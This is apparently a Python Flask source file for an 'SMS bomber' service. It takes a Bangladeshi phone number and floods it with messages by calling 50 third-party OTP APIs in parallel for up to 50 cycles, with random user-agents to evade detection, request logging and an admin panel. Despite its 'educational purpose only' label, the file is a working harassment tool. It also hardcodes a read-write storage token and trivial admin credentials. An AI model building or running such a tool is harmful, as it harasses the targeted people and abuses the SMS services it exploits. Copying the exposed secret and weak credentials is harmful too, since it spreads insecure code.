import time
import random
import os
import json
import base64
from datetime import datetime, timedelta
from functools import wraps
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import requests
from fake_useragent import UserAgent

from api.utils import random_string
from api.batch1 import *
from api.batch2 import *
from api.batch3 import *
from api.batch4 import *
from api.batch5 import *

app = Flask(__name__)
CORS(app)
app.config['SECRET_KEY'] = os.urandom(24)

# ============= VERCEL BLOB STORAGE =============
BLOB_TOKEN = os.environ.get("BLOB_READ_WRITE_TOKEN", "vercel_blob_rw_iEm1cQll1zLO32rY_Nxymx4P2A6wXFLpVhixHib3Zm6hJP2")
BLOB_BASE_URL = "https://blob.vercel-storage.com"

class BlobStorage:
    @staticmethod
    def _request(method, path, data=None):
        url = f"{BLOB_BASE_URL}/{path}"
        headers = {
            "Authorization": f"Bearer {BLOB_TOKEN}",
            "Content-Type": "application/json"
        }
        if method == "GET":
            resp = requests.get(url, headers=headers)
        elif method == "PUT":
            resp = requests.put(url, headers=headers, data=data)
        elif method == "HEAD":
            resp = requests.head(url, headers=headers)
        else:
            raise ValueError("Unsupported method")
        return resp

    @staticmethod
    def get(key):
        """Get blob content as string"""
        try:
            resp = BlobStorage._request("GET", key)
            if resp.status_code == 200:
                return resp.text
            return None
        except:
            return None

    @staticmethod
    def put(key, content):
        """Upload string content to blob"""
        try:
            resp = BlobStorage._request("PUT", key, data=content)
            return resp.status_code == 200
        except:
            return False

    @staticmethod
    def exists(key):
        """Check if blob exists"""
        try:
            resp = BlobStorage._request("HEAD", key)
            return resp.status_code == 200
        except:
            return False

# ============= DATA HELPERS =============
def load_json(key, default):
    """Load JSON from blob or return default"""
    data = BlobStorage.get(key)
    if data:
        try:
            return json.loads(data)
        except:
            return default
    return default

def save_json(key, data):
    """Save JSON to blob"""
    return BlobStorage.put(key, json.dumps(data, indent=2))

def get_settings():
    return load_json("settings.json", {"api_enabled": True})

def save_settings(settings):
    return save_json("settings.json", settings)

def get_blocked_numbers():
    return load_json("blocked_numbers.json", ["01744298642"])

def save_blocked_numbers(numbers):
    return save_json("blocked_numbers.json", numbers)

def get_logs():
    return load_json("logs.json", [])

def save_logs(logs):
    # Keep only last 2000 logs
    if len(logs) > 2000:
        logs = logs[-2000:]
    return save_json("logs.json", logs)

def add_log(entry):
    logs = get_logs()
    logs.append(entry)
    save_logs(logs)

# ============= ADMIN AUTH DECORATOR =============
def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or auth.username != "Admin" or auth.password != "1122":
            return jsonify({"error": "Unauthorized"}), 401
        return f(*args, **kwargs)
    return decorated

# ============= API FUNCTIONS (unchanged list) =============
API_FUNCTIONS = [
    api_1, api_2, api_3, api_4, api_5, api_6, api_7, api_8, api_9, api_10,
    api_11, api_12, api_13, api_14, api_15, api_16, api_17, api_18, api_19,
    api_20, api_21, api_22, api_23, api_24, api_25, api_26, api_27, api_28,
    api_29, api_30, api_31, api_32, api_33, api_34, api_35, api_36, api_37,
    api_38, api_39, api_40, api_41, api_42, api_43, api_44, api_45, api_46,
    api_47, api_48, api_49, api_50
]

def call_single_api(api_func, number, pgen=None, egen=None, did=None, did2=None, name=None):
    """Execute a single API call with random user-agent"""
    try:
        time.sleep(random.uniform(0.05, 0.15))
        
        # Apply random user-agent to requests globally for this call
        ua = UserAgent()
        original_get = requests.get
        original_post = requests.post
        def get_with_ua(*args, **kwargs):
            headers = kwargs.get('headers', {})
            headers['User-Agent'] = ua.random
            kwargs['headers'] = headers
            return original_get(*args, **kwargs)
        def post_with_ua(*args, **kwargs):
            headers = kwargs.get('headers', {})
            headers['User-Agent'] = ua.random
            kwargs['headers'] = headers
            return original_post(*args, **kwargs)
        requests.get = get_with_ua
        requests.post = post_with_ua
        
        # Call the API
        if api_func in [api_9]:
            result = api_func(number, pgen, egen, did, name)
        elif api_func in [api_31]:
            result = api_func(number, egen, name)
        elif api_func in [api_33]:
            result = api_func(number, pgen, name)
        elif api_func in [api_37, api_39]:
            result = api_func(number, pgen, egen, name)
        else:
            result = api_func(number)
        
        # Restore original functions
        requests.get = original_get
        requests.post = original_post
        
        if result and hasattr(result, 'status_code'):
            return result.status_code == 200
        return False
    except Exception:
        # Restore on exception
        requests.get = original_get
        requests.post = original_post
        return False

def execute_bombing(number, req_count):
    """Execute bombing requests and return combined statistics"""
    total_sent = 0
    total_attempts = 0
    working_api_count = 0
    failed_api_count = 0
    all_api_status = {}
    
    start_time = time.time()
    
    for cycle in range(req_count):
        pgen = random_string("?n?n?n?n?n?n?n?n?n?n?n?n")
        egen = random_string("?n?n?n?n?n?n?n?n")
        did = random_string("?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i")
        name = random_string("?l?l?l?l?l?l")
        
        cycle_success = 0
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = []
            for api_func in API_FUNCTIONS:
                future = executor.submit(call_single_api, api_func, number, pgen, egen, did, None, name)
                futures.append((api_func.__name__, future))
            
            for api_name, future in futures:
                success = future.result()
                total_attempts += 1
                
                if success:
                    total_sent += 1
                    cycle_success += 1
                    
                    if api_name not in all_api_status:
                        all_api_status[api_name] = {"working": 0, "failed": 0}
                    all_api_status[api_name]["working"] += 1
                else:
                    if api_name not in all_api_status:
                        all_api_status[api_name] = {"working": 0, "failed": 0}
                    all_api_status[api_name]["failed"] += 1
        
        if cycle < req_count - 1:
            time.sleep(1.5)
    
    execution_time = time.time() - start_time
    
    for api_name, status in all_api_status.items():
        if status["working"] > 0:
            working_api_count += 1
        else:
            failed_api_count += 1
    
    success_rate = (total_sent / total_attempts * 100) if total_attempts > 0 else 0
    
    response = {
        "status": "success",
        "message": "SMS bombing completed",
        "target": number,
        "summary": {
            "total_cycles": req_count,
            "total_requests": total_attempts,
            "sms_sent": total_sent,
            "sms_failed": total_attempts - total_sent,
            "success_rate": f"{success_rate:.2f}%",
            "execution_time": f"{execution_time:.2f} seconds"
        },
        "api_performance": {
            "working_apis": working_api_count,
            "failed_apis": failed_api_count,
            "total_apis": len(API_FUNCTIONS)
        },
        "disclaimer": "⚠️ Educational purpose only"
    }
    
    return response

# ============= MAIN ENDPOINT =============
@app.route('/', methods=['GET'])
def root():
    number = request.args.get('number')
    req_count = request.args.get('req')
    
    # Check if API is enabled globally
    settings = get_settings()
    if not settings.get("api_enabled", True):
        return jsonify({
            "status": "error",
            "message": "Service is temporarily disabled by admin",
            "error": "API is currently OFF"
        }), 503
    
    if number is None:
        return jsonify({
            "status": "error",
            "message": "Invalid request",
            "usage": {
                "endpoint": "/?number=017xxxxxxxx&req=1",
                "example": "/?number=01712345678&req=5",
                "parameters": {
                    "number": "11 digits phone number (without +88)",
                    "req": "Number of cycles (default: 1)"
                }
            },
            "disclaimer": "⚠️ Educational purpose only"
        }), 400
    
    number = str(number).strip()
    
    if not number.isdigit():
        return jsonify({
            "status": "error",
            "message": "Invalid phone number",
            "error": "Number must contain only digits",
            "example": "01712345678"
        }), 400
    
    if len(number) != 11:
        return jsonify({
            "status": "error",
            "message": "Invalid phone number length",
            "error": f"Expected 11 digits, got {len(number)} digits",
            "example": "01712345678"
        }), 400
    
    if not number.startswith('01'):
        return jsonify({
            "status": "error",
            "message": "Invalid phone number prefix",
            "error": "Number must start with 01",
            "example": "01712345678"
        }), 400
    
    # Check if number is blocked
    blocked_numbers = get_blocked_numbers()
    if number in blocked_numbers:
        # Log failed attempt
        add_log({
            "timestamp": datetime.now().isoformat(),
            "number": number,
            "req_count": req_count if req_count else 1,
            "status": "Failed",
            "reason": "Number blocked"
        })
        return jsonify({
            "status": "error",
            "message": "This number is blocked from receiving SMS",
            "error": "Number is in blocklist"
        }), 403
    
    if not req_count:
        req_count = 1
    else:
        try:
            req_count = int(req_count)
            if req_count < 1:
                req_count = 1
            if req_count > 50:
                return jsonify({
                    "status": "error",
                    "message": "Request limit exceeded",
                    "error": "Maximum 50 cycles allowed",
                    "max_allowed": 50
                }), 400
        except ValueError:
            return jsonify({
                "status": "error",
                "message": "Invalid request count",
                "error": "req must be a valid number",
                "example": "req=5"
            }), 400
    
    try:
        result = execute_bombing(number, req_count)
        
        # Log successful attempt
        add_log({
            "timestamp": datetime.now().isoformat(),
            "number": number,
            "req_count": req_count,
            "status": "Success" if result["summary"]["sms_sent"] > 0 else "Failed",
            "sms_sent": result["summary"]["sms_sent"]
        })
        
        return jsonify(result), 200
        
    except Exception as e:
        # Log error
        add_log({
            "timestamp": datetime.now().isoformat(),
            "number": number,
            "req_count": req_count,
            "status": "Failed",
            "reason": str(e)
        })
        return jsonify({
            "status": "error",
            "message": "Execution failed",
            "error": str(e)
        }), 500

# ============= ADMIN ENDPOINTS =============
@app.route('/admin', methods=['GET'])
def admin_panel():
    """Serve admin HTML page"""
    try:
        with open('admin.html', 'r', encoding='utf-8') as f:
            return f.read()
    except:
        return "Admin page not found", 404

@app.route('/admin/status', methods=['GET'])
@admin_required
def admin_status():
    settings = get_settings()
    blocked = get_blocked_numbers()
    return jsonify({
        "api_enabled": settings.get("api_enabled", True),
        "blocked_numbers": blocked
    })

@app.route('/admin/set_api_status', methods=['POST'])
@admin_required
def set_api_status():
    data = request.json
    enabled = data.get('enabled', True)
    settings = get_settings()
    settings['api_enabled'] = enabled
    save_settings(settings)
    return jsonify({"success": True, "api_enabled": enabled})

@app.route('/admin/blocked', methods=['GET'])
@admin_required
def get_blocked():
    return jsonify(get_blocked_numbers())

@app.route('/admin/blocked/add', methods=['POST'])
@admin_required
def add_blocked():
    data = request.json
    number = str(data.get('number', '')).strip()
    if not number or not number.isdigit() or len(number) != 11:
        return jsonify({"error": "Invalid number format"}), 400
    blocked = get_blocked_numbers()
    if number not in blocked:
        blocked.append(number)
        save_blocked_numbers(blocked)
    return jsonify({"success": True, "blocked_numbers": blocked})

@app.route('/admin/blocked/remove', methods=['POST'])
@admin_required
def remove_blocked():
    data = request.json
    number = str(data.get('number', '')).strip()
    blocked = get_blocked_numbers()
    if number in blocked:
        blocked.remove(number)
        save_blocked_numbers(blocked)
    return jsonify({"success": True, "blocked_numbers": blocked})

@app.route('/admin/logs', methods=['GET'])
@admin_required
def get_logs_paginated():
    page = int(request.args.get('page', 1))
    per_page = int(request.args.get('per_page', 20))
    logs = get_logs()
    # Reverse to show newest first
    logs.reverse()
    total = len(logs)
    start = (page - 1) * per_page
    end = start + per_page
    paginated_logs = logs[start:end]
    return jsonify({
        "logs": paginated_logs,
        "total": total,
        "page": page,
        "per_page": per_page,
        "total_pages": (total + per_page - 1) // per_page
    })

@app.route('/admin/stats', methods=['GET'])
@admin_required
def get_stats():
    logs = get_logs()
    today = datetime.now().date()
    yesterday = today - timedelta(days=1)
    this_month = today.replace(day=1)
    
    today_count = 0
    yesterday_count = 0
    month_count = 0
    total_requests = len(logs)
    
    for log in logs:
        try:
            log_date = datetime.fromisoformat(log['timestamp']).date()
            if log_date == today:
                today_count += 1
            if log_date == yesterday:
                yesterday_count += 1
            if log_date >= this_month:
                month_count += 1
        except:
            pass
    
    return jsonify({
        "total_requests": total_requests,
        "today": today_count,
        "yesterday": yesterday_count,
        "monthly": month_count
    })

# ============= HEALTH CHECK =============
@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({
        "status": "healthy",
        "service": "SMS API Service",
        "total_apis": len(API_FUNCTIONS),
        "timestamp": time.time()
    }), 200

@app.errorhandler(404)
def not_found(error):
    return jsonify({
        "status": "error",
        "message": "Endpoint not found",
        "available_endpoints": [
            "/?number=017xxxxxxxx&req=1",
            "/health",
            "/admin"
        ]
    }), 404

if __name__ == '__main__':
    print("=" * 50)
    print("SMS API Service (Educational Purpose)")
    print("=" * 50)
    print(f"Total APIs: {len(API_FUNCTIONS)}")
    print(f"Server: http://0.0.0.0:5000")
    print(f"Admin Panel: http://0.0.0.0:5000/admin")
    print("=" * 50)
    print("⚠️ FOR EDUCATIONAL USE ONLY")
    print("=" * 50)
    
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
